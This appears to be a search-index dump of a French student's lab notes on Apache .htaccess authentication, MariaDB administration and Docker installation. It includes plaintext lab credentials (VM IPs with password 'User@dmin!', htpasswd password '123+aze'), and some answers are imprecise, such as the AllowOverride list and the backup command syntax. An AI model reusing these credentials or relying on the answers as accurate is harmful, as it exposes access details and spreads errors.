123+aze\n</code></pre>"},{"location":"cours-TP/C_Systems/tp1/tp1/#f-quelle-demarche-vous-a-permis-de-verifier-que-le-compte-leon-avec-le-mot-de-passe-123aze-a-bien-acces-au-repertoire-secure","title":"f) Quelle d\u00e9marche vous a permis de v\u00e9rifier que le compte \u00ab leon \u00bb avec le mot de passe \u00ab 123+aze \u00bb a bien acc\u00e8s au r\u00e9pertoire \u00ab secure \u00bb ?","text":"<p> On entre dans /secure </p> <p>Apr\u00e8s connexion  :  </p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#15-fichier-htaccess","title":"15 - Fichier .htaccess","text":""},{"location":"cours-TP/C_Systems/tp1/tp1/#a-quest-ce-quune-reecriture-durl-quel-module-est-necessaire-pour-faire-une-reecriture-durl","title":"a) Qu\u2019est ce qu\u2019une r\u00e9\u00e9criture d\u2019URL ? Quel module est n\u00e9cessaire pour faire une r\u00e9\u00e9criture d\u2019URL ?","text":"<p>Une r\u00e9\u00e9criture d\u2019URL consiste \u00e0 transformer une URL demand\u00e9e par le client (ex. /produit/123) en une autre URL interne (ex. /produit.php?id=123) sans que l\u2019utilisateur le voie. Le module n\u00e9cessaire est : <code>mod_rewrite</code></p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#b-quest-ce-quun-framework","title":"b) Qu\u2019est ce qu\u2019un Framework ?","text":"<p>Un Framework est un ensemble structur\u00e9 de biblioth\u00e8ques, outils et conventions qui facilite le d\u00e9veloppement d\u2019applications.</p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#c-a-quoi-sert-la-directive-allowoverride","title":"c) A quoi sert la directive AllowOverride ?","text":"<p>lle d\u00e9finit quelles directives peuvent \u00eatre surcharg\u00e9es via un fichier .htaccess dans un r\u00e9pertoire. <pre><code>Si AllowOverride est \u00e0 None, Apache ignore tous les .htaccess.\n\nSi elle est \u00e0 All ou un sous-ensemble, Apache autorise certaines directives dans les .htaccess.\n</code></pre></p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#d-quels-sont-les-6-parametres-pris-en-compte-par-la-directive-allowoverride","title":"d) Quels sont les 6 param\u00e8tres pris en compte par la directive AllowOverride ?","text":"<ol> <li>AuthConfig : Authentification (ex. AuthType, Require)</li> <li>FileInfo : Manipulation de fichiers (ex. AddType, RewriteRule)</li> <li>Indexes : Listing de r\u00e9pertoires (Options +Indexes)</li> <li>Limit : Contr\u00f4le d\u2019acc\u00e8s (Allow, Deny, Require)</li> <li>Options : Options Apache (Options FollowSymLinks)</li> <li>None : Aucun override autoris\u00e9</li> </ol>"},{"location":"cours-TP/C_Systems/tp1/tp1/#e-lequel-des-parametres-permet-dautoriser-lusage-dune-reecriture-durl-a-partir-dun-fichier-htaccess","title":"e) Lequel des param\u00e8tres permet d\u2019autoriser l\u2019usage d\u2019une r\u00e9\u00e9criture d\u2019URL a partir d\u2019un fichier .htaccess ?","text":"<p>FileInfo</p> <p>C\u2019est ce param\u00e8tre qui permet d\u2019utiliser des directives comme RewriteEngine et RewriteRule dans un .htaccess.</p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#f-creez-un-repertoire-private-avec-un-fichier-htaccess-donnez-le-contenu-du-fichier-htaccess","title":"f) Cr\u00e9ez un r\u00e9pertoire \u00ab private \u00bb avec un fichier .htaccess. Donnez le contenu du fichier .htaccess","text":"<p>Dans le fichier /home/web/www.campagne.sys/private/.htacces :  <pre><code>AuthType Basic\nAuthName \"Zone priv\u00e9e\"\nAuthUserFile /etc/httpd/.htpasswd\nRequire user gaston\n</code></pre></p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#g-dans-le-fichier-htaccess-precedent-mettez-en-place-les-directives-necessaires-pour-autoriser-uniquement-lutilisateur-apache-gaston123aze-a-acceder-au-repertoire-quelle-est-votre-demarche-quelles-commandes-avez-vous-utilisees","title":"g) Dans le fichier .htaccess pr\u00e9c\u00e9dent, mettez en place les directives n\u00e9cessaires pour autoriser uniquement l\u2019utilisateur \u00ab Apache gaston/123+aze \u00bb a acc\u00e9der au r\u00e9pertoire. Quelle est votre d\u00e9marche ? Quelles commandes avez-vous utilis\u00e9es ?","text":"<p>Il faut cr\u00e9e un .htpasswd :  <code>sudo htpasswd -c /etc/httpd/.htpasswd gaston</code> gaston \u00e0 comme mdp : 123+aze</p> <p>Dans le .conf de www.campagne.sys on <code>AllowOverride All</code></p> <p>On test : http://www.campagne.sys:8086/private  Cela marche :  </p>"},{"location":"cours-TP/C_Systems/tp1/tp1/#16-personnalisation-de-pages-derreurs","title":"16 - Personnalisation de pages d'erreurs","text":""},{"location":"cours-TP/C_Systems/tp1/tp1/#a-utilisez-la-directive-errordocument-pour-afficher-une-jolie-page-derreur-404-cette-url-devrait-vous-inspirer-httpswwwleptidigitalfrwebmarketingpages-erreur-404-8896-quels-fichiers-avez-vous-modifies-donnez-les-modifications","title":"a) Utilisez la directive \u00ab ErrorDocument \u00bb pour afficher une jolie page d\u2019erreur 404. Cette URL devrait vous inspirer : https://www.leptidigital.fr/webmarketing/pages-erreur-404-8896/ . Quels fichiers avez-vous modifi\u00e9s ? Donnez les modifications.","text":"<p>Dans le fichier <code>campagne.conf</code> il faut  rajouter :  </p> <p>J'ai ensuite fais un redirection appell\u00e9 404.html avec un page d'erreur faites par l'IA basique avec un retour \u00e0 l'accueil: </p> <p></p>"},{"location":"cours-TP/C_Systems/tp2/tp2/","title":"Linux TD2 \u2013 MySQL/MariaDB","text":"<pre><code>ip vm : 172.18.154.21\nlogin : user\npassw : User@dmin!\n</code></pre> <p>Installation :  Tunnel : </p> <p>SSH Vm2 : </p>"},{"location":"cours-TP/C_Systems/tp2/tp2/#2-desactivation-du-pare-feu","title":"2 : D\u00e9sactivation du pare-feu.","text":""},{"location":"cours-TP/C_Systems/tp2/tp2/#3-installation","title":"3 : Installation","text":""},{"location":"cours-TP/C_Systems/tp2/tp2/#installez-le-package-mariadb-server","title":"Installez le package mariadb-server","text":""},{"location":"cours-TP/C_Systems/tp2/tp2/#a-installez-le-package-mariadb-que-contient-ce-package","title":"a) Installez le package mariadb. Que contient ce package ?","text":"<p>Le package contient toutes les d\u00e9pendances ci dessus.</p>"},{"location":"cours-TP/C_Systems/tp2/tp2/#b-quest-ce-que-mariadb-par-rapport-a-mysql","title":"b) Qu\u2019est ce que mariadb par rapport a mysql ?","text":"<p>MariaDB est un fork de MYSQL, cr\u00e9e par les cr\u00e9ateur de MYSQL. MariaDB est une version ind\u00e9pendante.</p>"},{"location":"cours-TP/C_Systems/tp2/tp2/#4-prise-en-main","title":"4 : Prise en main","text":""},{"location":"cours-TP/C_Systems/tp2/tp2/#a-quel-est-le-fichier-de-configuration-de-configuration-de-mariadb","title":"a) Quel est le fichier de configuration de configuration de mariadb ?","text":""},{"location":"cours-TP/C_Systems/tp2/tp2/#b-quel-est-son-format","title":"b) Quel est son format ?","text":""},{"location":"cours-TP/C_Systems/tp2/tp2/#c-quel-est-une-de-ses-particularites","title":"c) Quel est une de ses particularit\u00e9s ?","text":"<p>Le fichier de configuration est bien organis\u00e9 et bien rang\u00e9.</p>"},{"location":"cours-TP/C_Systems/tp2/tp2/#d-quel-est-le-repertoire-de-travail-utilise-par-le-serveur-pour-stocker-les-bases-de-donnees","title":"d) Quel est le r\u00e9pertoire de travail utilis\u00e9 par le serveur pour stocker les bases de donn\u00e9es?","text":"<p>Le dossier est <code>/var/lib/mysql</code></p>"},{"location":"cours-TP/C_Systems/tp2/tp2/#e-cet-emplacement-vous-semble-t-il-pertinent-justifiez-votre-reponse","title":"e) Cet emplacement vous semble-t-il pertinent ? Justifiez votre r\u00e9ponse.","text":"<p>Non car il se trouve sur le disque principal et si le disque est pleins alors les bases de donn\u00e9es seront vites limit\u00e9s en stockages.</p>"},{"location":"cours-TP/C_Systems/tp2/tp2/#f-proposez-une-configuration-plus-conforme-a-celle-dun-serveur-de-production","title":"f) Proposez une configuration plus conforme a celle d\u2019un serveur de production.","text":"<p>Il faudrait : un disque sp\u00e9cifiquement pour le serveur mysql. Puis copier les donn\u00e9es du dossier \u00e0 l'autre avec </p>"},{"location":"cours-TP/C_Systems/tp2/tp2/#5-demarrez-le-service-mariadb","title":"5 . D\u00e9marrez le service mariadb","text":""},{"location":"cours-TP/C_Systems/tp2/tp2/#a-sur-quel-port-est-a-lecoute-le-service-mariadb-par-defaut-quelle-commande-avez-vous-utilise","title":"a) Sur quel port est a l\u2019\u00e9coute le service mariadb par d\u00e9faut ? Quelle commande avez-vous utilis\u00e9 ?","text":"<p>Par d\u00e9faut mariadb \u00e9coute sur 3306. </p>"},{"location":"cours-TP/C_Systems/tp2/tp2/#b-sur-quelles-ip-le-service-est-il-a-lecoute","title":"b) Sur quelle\u00b7s IP le service est-il a l\u2019\u00e9coute ?","text":"<p>Le service est \u00e0 l'\u00e9coute sur toutes les l'adresses  On le voit avec le \"*\".</p>"},{"location":"cours-TP/C_Systems/tp2/tp2/#6-connexion-au-service","title":"6 . Connexion au service","text":""},{"location":"cours-TP/C_Systems/tp2/tp2/#a-quelle-commande-vous-permet-de-joindre-votre-serveur-mariadb","title":"a) Quelle commande vous permet de joindre votre serveur mariadb ?","text":"<p><code>sudo mariadb</code> </p>"},{"location":"cours-TP/C_Systems/tp2/tp2/#b-que-permet-de-faire-loption-protocol","title":"b) Que permet de faire l\u2019option  --protocol ?","text":"<p>Permet de forcer le protocole utilis\u00e9. Tel que tcp par exemple.</p>"},{"location":"cours-TP/C_Systems/tp2/tp2/#c-quelle-est-lautre-methode-permettant-de-joindre-un-service-mariadb-quelle-est-sa-limite","title":"c) Quelle est l\u2019autre m\u00e9thode permettant de joindre un service mariadb ? Quelle est sa limite ?","text":"<p>On peut utiliser un socket unix. Cependant cela fonctionne que en Local.</p>"},{"location":"cours-TP/C_Systems/tp2/tp2/#d-quel-est-le-protocole-utilise-par-defaut-par-le-client-cf-la-commande-precedente-pour-joindre-le-service-mariadb-comment-lavez-vous-prouve","title":"d) Quel est le protocole utilis\u00e9 par d\u00e9faut par le client (cf la commande pr\u00e9c\u00e9dente ) pour joindre le service mariadb ? Comment l\u2019avez vous prouv\u00e9 ?","text":"<p> La commande <code>status</code> permet d'affichger le protocole utilis\u00e9. on voit ici qu'on se connecte en socket unix vial a commande sudo mariadb.</p>"},{"location":"cours-TP/C_Systems/tp2/tp2/#7-securisation","title":"7 . S\u00e9curisation","text":""},{"location":"cours-TP/C_Systems/tp2/tp2/#a-quel-est-le-compte-administrateur-utilise-par-mariadb","title":"a) Quel est le compte administrateur utilis\u00e9 par mariadb ?","text":"<p>Le compte est <code>root</code></p>"},{"location":"cours-TP/C_Systems/tp2/tp2/#b-que-ce-passe-t-il-si-vous-tentez-de-vous-connecter-sur-le-service-mariadb-et-utilisant-lip-de-la-vm-lip-pas-ladresse-de-bouclage","title":"b) Que ce passe-t-il si vous tentez de vous connecter sur le service mariadb et utilisant l\u2019IP de la VM ? (l\u2019IP , pas l\u2019adresse de bouclage!!)","text":"<p> On se fait refuser la connection.</p>"},{"location":"cours-TP/C_Systems/tp2/tp2/#c-que-ce-passe-t-il-si-vous-utilisez-ladresse-127001-comment-avez-vous-prouve-que-vous-etes-bien-connecte-en-tcpip-quelle-commande-avez-vous-utilise-pour-le-prouver-quelle-commande-avez-vous-utilise-pour-vous-connecter","title":"c) Que ce passe-t-il si vous utilisez l\u2019adresse 127.0.0.1. Comment avez-vous prouv\u00e9 que vous \u00eates bien connect\u00e9 en TCP/IP. Quelle commande avez-vous utilis\u00e9 pour le prouver ? Quelle commande avez-vous utilis\u00e9 pour vous connecter ?","text":""},{"location":"cours-TP/C_Systems/tp2/tp2/#d-meme-question-que-precedemment-mais-en-utilisant-localhost","title":"d) M\u00eame question que pr\u00e9c\u00e9demment, mais en utilisant localhost.","text":"<p>Et maintenant \u00e7a marche :  </p>"},{"location":"cours-TP/C_Systems/tp2/tp2/#e-vous-avez-constate-que-le-serveur-ne-demande-jamais-de-mot-de-passe-sur-quoi-repose-la-securite-des-donnees-quels-sont-les-risques-sur-un-serveur-de-production-hebergeant-par-exemple-un-service-apache-tomcat-ou-autre-et-le-service-mariadb","title":"e)  Vous avez constat\u00e9 que le serveur ne demande jamais de mot de passe. Sur quoi repose la s\u00e9curit\u00e9 des donn\u00e9es ? Quels sont les risques sur un serveur de production h\u00e9bergeant par exemple un service Apache, Tomcat ou autre et le service mariadb ?","text":"<p>Le probl\u00e8me est que le mot de passe est quelque chsoe de priv\u00e9 et l'user un truc en autre publique donc si quelqu'un arrive \u00e0 \u00eatre root il pourra directement se connecter sans mdp.</p>"},{"location":"cours-TP/C_Systems/tp2/tp2/#le-script-mysql_secure_installation-permet-de-securiser-une-installation-de-mariadb","title":"Le script mysql_secure_installation permet de s\u00e9curiser une installation de mariadb.","text":"<p><code>sudo mysql_secure_installation</code></p>"},{"location":"cours-TP/C_Systems/tp2/tp2/#fixer-un-mdp-pour-le-compte-root","title":"Fixer un mdp pour le compte root","text":""},{"location":"cours-TP/C_Systems/tp2/tp2/#supprimer-le-compte-anonyme","title":"Supprimer le compte anonyme","text":""},{"location":"cours-TP/C_Systems/tp2/tp2/#autorisez-les-acces-distants-pour-le-compte-root","title":"Autorisez les acc\u00e8s distants pour le compte root","text":""},{"location":"cours-TP/C_Systems/tp2/tp2/#laissez-la-db-test-sur-le-serveur","title":"Laissez la DB test sur le serveur","text":""},{"location":"cours-TP/C_Systems/tp2/tp2/#accepter-lapplication-immediate-des-changements-flush-des-privileges","title":"Accepter l\u2019application imm\u00e9diate des changements (Flush des privil\u00e8ges)","text":""},{"location":"cours-TP/C_Systems/tp2/tp2/#8-creation-dune-db-via-un-script-sql","title":"8 . Cr\u00e9ation d'une DB via un script SQL","text":""},{"location":"cours-TP/C_Systems/tp2/tp2/#a-creer-la-db-worlddb-comment-avez-vous-procede","title":"a)  Cr\u00e9er la DB worlddb. Comment avez-vous proc\u00e9d\u00e9 ?","text":""},{"location":"cours-TP/C_Systems/tp2/tp2/#b-affichez-la-liste-des-db-gerees-par-mariadb","title":"b) Affichez la liste des DB g\u00e9r\u00e9es par mariadb ?","text":""},{"location":"cours-TP/C_Systems/tp2/tp2/#c-injecter-le-script-worlddb-final-utf8sql-quelle-commande-avez-vous-utilisee","title":"c) Injecter le script WORLDDB-FINAL-UTF8.sql. Quelle commande avez vous utilis\u00e9e ?","text":"<p>Il faut envoyer le fichier dans worlddb.</p>"},{"location":"cours-TP/C_Systems/tp2/tp2/#d-quelles-sont-les-tables-presentes-quelle-commande-avez-vous-utilise","title":"d)  Quelles sont les tables pr\u00e9sentes ? Quelle commande avez vous utilis\u00e9 ?","text":""},{"location":"cours-TP/C_Systems/tp2/tp2/#e-combien-de-pays-sont-stockes-dans-la-db","title":"e) Combien de pays sont stock\u00e9s dans la DB ?","text":""},{"location":"cours-TP/C_Systems/tp2/tp2/#f-donnez-un-schema-de-la-db","title":"f) Donnez un sch\u00e9ma de la DB.","text":"<p><code>country</code> <code>city</code> <code>countrylanguage</code> </p>"},{"location":"cours-TP/C_Systems/tp2/tp2/#g-le-fichier-sakila-dbzip-contient-une-db-de-demonstration","title":"g) Le fichier sakila-db.zip contient une DB de d\u00e9monstration.","text":""},{"location":"cours-TP/C_Systems/tp2/tp2/#h-affiche-les-5-premiers-acteurs-de-la-db-sakila-table-actor","title":"h) Affich\u00e9 les 5 premiers acteurs de la DB sakila (table actor)","text":""},{"location":"cours-TP/C_Systems/tp2/tp2/#i-quelles-sont-les-db-gerees-par-le-serveur","title":"I) Quelles sont les DB g\u00e9r\u00e9es par le serveur ?","text":"<p>Celles-la :  </p>"},{"location":"cours-TP/C_Systems/tp2/tp2/#j-supprimez-la-db-sakila-et-verifiez-la-suppression-quelles-commandes-avez-vous-utilisees","title":"j) Supprimez la DB sakila, et v\u00e9rifiez la suppression. Quelles commandes avez vous utilis\u00e9es ?","text":""},{"location":"cours-TP/C_Systems/tp2/tp2/#9-gestion-des-comptes-et-acces","title":"9 . Gestion des comptes et acc\u00e8s","text":""},{"location":"cours-TP/C_Systems/tp2/tp2/#a-quelles-seraient-les-consequences-possibles-si-lapplication-web-par-exemple-presente-des-failles-de-securite","title":"a) Quelles seraient les cons\u00e9quences possibles si l\u2019application web, par exemple, pr\u00e9sente des failles de s\u00e9curit\u00e9 ?","text":"<p>Les cons\u00e9quences seraient :  - Une fuite de donn\u00e9es - Une modifications de donn\u00e9es</p>"},{"location":"cours-TP/C_Systems/tp2/tp2/#b-quest-ce-quune-injection-sql","title":"b) Qu\u2019est ce qu\u2019une injection SQL ?","text":"<p>Une injection SQL est un type d'attaque o\u00f9 l'attaquant envoie une requete SQL dans un formulaire.</p>"},{"location":"cours-TP/C_Systems/tp2/tp2/#c-creez-un-compte-worldbuser-quelle-commande-sql-permet-de-creer-un-utilisateur","title":"c) Cr\u00e9ez un compte \u00ab worldbuser \u00bb. Quelle commande SQL permet de cr\u00e9er un utilisateur ?","text":""},{"location":"cours-TP/C_Systems/tp2/tp2/#d-donnez-tous-les-droits-a-lutilisateur-worldbuser-sur-la-db-worlddb-quelle-commande-sql-permet-de-donner-tous-les-droits-sur-une-db-a-un-utilisateur-particulier","title":"d) Donnez tous les droits a l\u2019utilisateur \u00ab worldbuser \u00bb sur la DB \u00ab worlddb \u00bb. Quelle commande SQL permet de donner tous les droits sur une DB a un utilisateur particulier ?","text":"<p> \"*\" signifie toutes les tables de la base worlddb</p>"},{"location":"cours-TP/C_Systems/tp2/tp2/#e-quelle-commande-sql-permet-de-voir-les-permissions-pour-un-utilisateur-quels-sont-les-droits-pour-lutilisateur-worlddbuser","title":"e) Quelle commande SQL permet de voir les permissions pour un utilisateur ? Quels sont les droits pour l\u2019utilisateur \u00ab worlddbuser \u00bb ?","text":""},{"location":"cours-TP/C_Systems/tp2/tp2/#f-a-quoi-sert-la-commande-sql-flush-privileges","title":"f) A quoi sert la commande SQL \u00ab FLUSH PRIVILEGES ; \u00bb ?","text":"<p>Elle permet de recharger la table de permissions.</p>"},{"location":"cours-TP/C_Systems/tp2/tp2/#g-comment-prouver-que-les-acces-sont-bien-fonctionnels-pour-le-compte-worlddbuser","title":"g) Comment prouver que les acc\u00e8s sont bien fonctionnels pour le compte \u00ab worlddbuser \u00bb.","text":"<p>En se connectant \u00e0 worlddbuser </p>"},{"location":"cours-TP/C_Systems/tp2/tp2/#h-quelles-sont-les-tables-accessibles-avec-le-compte-worlddbuser-quelles-commandes-avez-vous-utilisees-pour-le-prouver","title":"h) Quelles sont les tables accessibles avec le compte \u00ab worlddbuser \u00bb. Quelles commandes avez-vous utilis\u00e9es pour le prouver ?","text":""},{"location":"cours-TP/C_Systems/tp2/tp2/#i-quelle-commande-sql-permet-de-revoquer-des-droits","title":"i) Quelle commande SQL permet de r\u00e9voquer des droits ?","text":"<p>La commande par exemple pour revoke les droit \u00e0 worlddb \u00e0 worldbuser :  <pre><code>REVOKE DELETE ON worlddb.* FROM 'worldbuser';\n</code></pre></p>"},{"location":"cours-TP/C_Systems/tp2/tp2/#j-a-quoi-sert-le-script-mysql_setpermission","title":"j) A quoi sert le script mysql_setpermission ?","text":"<p><code>mysql_setpermission</code> est un script qu iguide l'admin \u00e0 travers plusieurs questions pour mettre des permissions.</p>"},{"location":"cours-TP/C_Systems/tp2/tp2/#k-a-quoi-sert-le-script-mysqlaccess","title":"k) A quoi sert le script mysqlaccess ?","text":"<p><code>mysqlaccess</code> est un script utilis\u00e9 pour v\u00e9rifier si un utilisateur poss\u00e8de des permissions.</p>"},{"location":"cours-TP/C_Systems/tp2/tp2/#10-sauvergarde-et-restauration","title":"10 . Sauvergarde et restauration","text":""},{"location":"cours-TP/C_Systems/tp2/tp2/#a-quels-sont-les-principaux-dangers-lies-a-une-mauvaise-securite","title":"a) Quels sont les principaux dangers li\u00e9s \u00e0 une mauvaise s\u00e9curit\u00e9 ?","text":"<ul> <li>Perte de donn\u00e9es</li> <li>Vols de donn\u00e9es</li> </ul>"},{"location":"cours-TP/C_Systems/tp2/tp2/#b-changer-la-population-de-tous-les-pays-en-la-fixant-a-10-donnez-la-commande-utilisee","title":"b) Changer la population de tous les pays en la fixant a 10. Donnez la commande utilis\u00e9e.","text":""},{"location":"cours-TP/C_Systems/tp2/tp2/#c-faire-une-sauvegarde-de-la-db-worlddb-en-nommant-le-script-dump-worldbsql","title":"c) Faire une sauvegarde de la DB \u00ab worlddb \u00bb en nommant le script dump-worldb.sql.","text":"<pre><code> mysqldump -u root -p worlddb &gt; dump-worldb.sql\n</code></pre>"},{"location":"cours-TP/C_Systems/tp2/tp2/#d-quelle-commande-est-utilisable-pour-faire-une-restauration-dune-db","title":"d) Quelle commande est utilisable pour faire une restauration d\u2019une DB ?","text":"<pre><code>mariadb -u root -p worlddb &lt; dump-worldb.sql\n</code></pre>"},{"location":"cours-TP/C_Systems/tp2/tp2/#e-quest-ce-quune-sauvegarde-logique","title":"e) Qu\u2019est ce qu\u2019une sauvegarde logique ?","text":"<p>Une sauvergarde logique consiste \u00e0 exporter des donn\u00e9es dans un format qu'un humain peut lire.</p>"},{"location":"cours-TP/C_Systems/tp2/tp2/#f-quels-sont-les-differents-type-de-sauvegardes-physiques","title":"f) Quels sont les diff\u00e9rents type de sauvegardes physiques ?","text":"<ul> <li>Cold Backup : serveur arr\u00eat\u00e9</li> <li>Hot Backup : serveur en cours d'execution</li> </ul>"},{"location":"cours-TP/C_Systems/tp2/tp2/#g-quelles-autres-commandes-sont-utilisees-pour-faire-une-sauvegarde","title":"g) Quelles autres commandes sont utilis\u00e9es pour faire une sauvegarde ?","text":"<pre><code>mariadbbackup [--backup -- targ-dir -- user -- password]\n</code></pre>"},{"location":"cours-TP/C_Systems/tp2/tp2/#h-quel-type-de-sauvegarde-est-propose","title":"h) Quel type de sauvegarde est propos\u00e9 ?","text":"<p>Une sauvergarde incr\u00e9mentielle.</p>"},{"location":"cours-TP/C_Systems/tp2/tp2/#i-quels-avantages-presente-t-il","title":"i) Quels avantages pr\u00e9sente-t-il ?","text":"<p>Les avantages :  - Plus rapide car elle sauvergarde que les nouvelles donn\u00e9es. - Prend moins de place sur le disque.</p>"},{"location":"cours-TP/C_Systems/tp2/tp2/#j-quels-sont-les-problemes-poses-par-ce-type-de-sauvegarde","title":"j) Quels sont les probl\u00e8mes pos\u00e9s par ce type de sauvegarde ?","text":"<p>Plus compliqu\u00e9 \u00e0 restaur\u00e9.</p>"},{"location":"cours-TP/C_Systems/tp2/tp2/#11-outils-graphiques","title":"11 . Outils graphiques.","text":""},{"location":"cours-TP/C_Systems/tp2/tp2/#a-quel-est-linteret-dune-connexion-a-travers-un-tunnel-ssh","title":"a) Quel est l\u2019int\u00e9r\u00eat d\u2019une connexion a travers un tunnel SSH ?","text":"<p>L'int\u00e9r\u00eat d'une connexion \u00e0 travers un tunnel SSH est :  - le chiffrement des donn\u00e9es - le contournement des pare-feu</p>"},{"location":"cours-TP/C_Systems/tp2/tp2/#12-replication-comme-solution-de-sauvegarde","title":"12 R\u00e9plication comme solution de sauvegarde ?","text":""},{"location":"cours-TP/C_Systems/tp2/tp2/#a-quels-sont-les-limites-de-la-replication","title":"a) Quels sont les limites de la r\u00e9plication ?","text":"<p>Si l'admin supprime des donn\u00e9es sur le serveur maitre alors tout le monde aura les donn\u00e9es supprim\u00e9s Si les donn\u00e9es sont deviennent corrompues, la corruption sera aussi sur les esclaves.</p>"},{"location":"cours-TP/C_Systems/tp2/tp2/#b-quels-sont-les-usages-courant-des-serveurs-de-replications-httpsmariadbcomkbenmariadb-maxscale-22-maxscale-failover-with-keepalived-and-maxctrl","title":"b) Quels sont les usages courant des serveurs de r\u00e9plications? (https://mariadb.com/kb/en/mariadb-maxscale-22-maxscale-failover-with-keepalived-and-maxctrl/)","text":"<ul> <li> <p>HIGH AVAILABILITY : Si le MAITRE tombe en panne alors l'ESCLAVE peut devenir le nouveau MAITRE</p> </li> <li> <p>LOAD BALANCING : Une app qui utilisent beaucoup de donn\u00e9es simultan\u00e9ment peut r\u00e9partir les perfommances sur les esclaves pour \u00eatre plus perfomants.</p> </li> </ul>"},{"location":"cours-TP/C_Systems/tp2/tp2/#c-creez-une-nouvelle-vm-installez-mariadb-et-les-outils-necessaires","title":"c) Cr\u00e9ez une nouvelle VM, installez mariadb et les outils n\u00e9cessaires","text":""},{"location":"cours-TP/C_Systems/tp2/tp2/#d-verifiez-la-connectivite-entre-les-vms","title":"d) V\u00e9rifiez la connectivit\u00e9 entre les VMs","text":"<p>Ping :   </p> <p>Acc\u00e8s \u00e0 mariadb depuis esclave :  </p> <p>### e) Configuration du serveur maitre (/etc/my.cnf.d/server.cnf, ne pas oublier de red\u00e9marrer le service apr\u00e8s la cr\u00e9ation du fichier)</p> <p><pre><code>sudo nano /etc/my.cnf.d/mariadb-server.cnf\n</code></pre> </p> <pre><code>sudo systemctl restart mariadb\n</code></pre>"},{"location":"cours-TP/C_Systems/tp2/tp2/#e-creation-dun-compte-pour-la-replication-ou-attribution-des-droits-sur-un-compte-existant-sur-le-serveur-maitre","title":"e) Cr\u00e9ation d\u2019un compte pour la r\u00e9plication ou attribution des droits sur un compte existant sur le serveur maitre","text":""},{"location":"cours-TP/C_Systems/tp2/tp2/#g-configuration-des-esclaves-etcmycnfdservercnf","title":"g) Configuration des esclaves (/etc/my.cnf.d/server.cnf)","text":""},{"location":"cours-TP/C_Systems/tp3/tp3/","title":"Linux TD3 \u2013 Docker","text":"<pre><code>ip vm : 172.18.90.126\nlogin : user\npassw : User@dmin!\n</code></pre>"},{"location":"cours-TP/C_Systems/tp3/tp3/#2-origines-de-conteneurs","title":"2 . Origines de conteneurs","text":""},{"location":"cours-TP/C_Systems/tp3/tp3/#a-quest-ce-quune-jails","title":"a) Qu\u2019est-ce qu\u2019une \u00ab jails \u00bb ?","text":"<p>Une jail est une fonctionnalit\u00e9 permettant de cr\u00e9er des environnements isol\u00e9s. </p>"},{"location":"cours-TP/C_Systems/tp3/tp3/#b-dans-quels-cadres-utilise-t-on-les-jails","title":"b) Dans quels cadres utilise-t-on les \u00ab jails \u00bb ?","text":"<p>On les utilises pour isol\u00e9 et s\u00e9curiser des services. Ou bien cr\u00e9er des environnements de d\u00e9veloppement</p>"},{"location":"cours-TP/C_Systems/tp3/tp3/#c-quel-est-lequivalent-des-jails-sous-linux","title":"c) Quel est l\u2019\u00e9quivalent des \u00ab jails \u00bb sous Linux ?","text":"<p>L'\u00e9quivalent sous linux :  - chroot - CGROUP</p>"},{"location":"cours-TP/C_Systems/tp3/tp3/#d-quest-ce-quun-cgroup-sous-linux","title":"d) Qu\u2019est-ce qu\u2019un CGROUP sous Linux ?","text":"<p>C'est une fonctionnalit\u00e9 permettant d elimiter et mesurer l'utilisations des ressources. Permet de limiter des conteneurs (conteneurs A = 2 GO de RAM)</p>"},{"location":"cours-TP/C_Systems/tp3/tp3/#3-les-conteneurs","title":"3 . Les conteneurs","text":""},{"location":"cours-TP/C_Systems/tp3/tp3/#a-quel-est-le-principe-de-la-conteneurisation","title":"a) Quel est le principe de la conteneurisation ?","text":"<p>Le principe est d'isoler une application et toutes ses d\u00e9pendances.</p>"},{"location":"cours-TP/C_Systems/tp3/tp3/#b-quel-est-la-difference-essentielle-entre-un-conteneur-et-une-vm","title":"b) Quel est la diff\u00e9rence essentielle entre un conteneur et une VM ?","text":"<ul> <li>La VM virtualise le mat\u00e9riel physique, avec l'OS qui tourne et rend lent a d\u00e9marrer</li> <li>Le conteneur virtualise l'OS, les contenenur partagent le noyaux de l'oS incluant seulement l'application et les d\u00e9pendances, elles sont plus rapides et l\u00e9gers \u00e0 d\u00e9marrer.</li> </ul>"},{"location":"cours-TP/C_Systems/tp3/tp3/#c-quels-sont-les-differents-types-de-conteneur-existant","title":"c) Quels sont les diff\u00e9rents types de conteneur existant ?","text":"<ul> <li>Conteneur d'application : Docker</li> <li>Conteneur de syst\u00e8me : LXC </li> </ul>"},{"location":"cours-TP/C_Systems/tp3/tp3/#d-realiser-linsatllation-de-docker-sur-votre-vm-lister-les-commandes-utilisees","title":"d) R\u00e9aliser l'insatllation de Docker sur votre VM. Lister les commandes utilis\u00e9es.","text":"<pre><code>sudo dnf install -y dnf-utils # installer les outils\n\nsudo dnf config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo # ajout du d\u00e9pot docker\n\nsudo dnf install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin #installer les paquets docker\n\nsudo systemctl start docker #demarrer docker\nsudo systemctl enable docker\n</code></pre>"},{"location":"cours-TP/C_Systems/tp3/tp3/#e-qui-peux-executer-docker-sur-votre-machine-expliquez-les-risques-que-cela-impose","title":"e) Qui peux ex\u00e9cuter docker sur votre machine, expliquez les risques que cela impose ?","text":"<p>L'utilisateur \"root\" et les utilisateur sudo</p>"},{"location":"cours-TP/C_Systems/tp3/tp3/#f-donner-lautorisation-a-lutilisateur-user-dutiliser-docker","title":"f)  Donner l'autorisation \u00e0 l'utilisateur user d'utiliser docker ?","text":"<pre><code>newgrp docker\nsudo usermod -aG docker user\n</code></pre>"},{"location":"cours-TP/C_Systems/tp3/tp3/#g-donnez-les-definitions-pour-les-termes-suivants","title":"g) Donnez les d\u00e9finitions pour les termes suivants :","text":"<p>Image : Un template l\u00e9ger autonomme contenant ce qui est n\u00e9cessaire pour ex\u00e9cuter une application.</p> <p>Conteneur : Un instance en cours d'execution d'une Image, il est isol\u00e9.</p> <p>Registre : Une service de stockage et de distribution pour les images Docker.</p> <p>Dockerfile : Un fichier texte contenant toutes les instrucitons n\u00e9cessaires pour build une image</p> <p>Docker Compose :  Un outil permettant de d\u00e9finir et d'executer des application docjer multi contenenurs</p> <p>Docker Hub : Le registre public par d\u00e9faut g\u00e9r\u00e9 par 